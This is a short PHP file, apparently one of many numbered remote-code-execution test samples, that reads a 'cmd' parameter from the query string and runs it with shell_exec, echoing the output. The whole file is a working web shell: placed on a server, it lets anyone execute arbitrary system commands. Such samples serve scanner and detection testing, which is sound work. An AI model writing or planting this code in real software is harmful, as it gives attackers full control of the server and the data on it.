<?php
// RCE test variation #1268
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>